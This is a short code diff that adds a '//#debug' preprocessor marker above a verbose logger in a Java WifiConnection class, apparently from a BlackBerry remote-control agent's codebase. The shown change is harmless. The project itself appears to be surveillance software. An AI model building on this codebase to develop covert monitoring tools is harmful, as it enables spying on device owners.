@@ -13,6 +13,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class WifiConnection extends Connection {
+	//#debug
     static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);
 
     private String host;
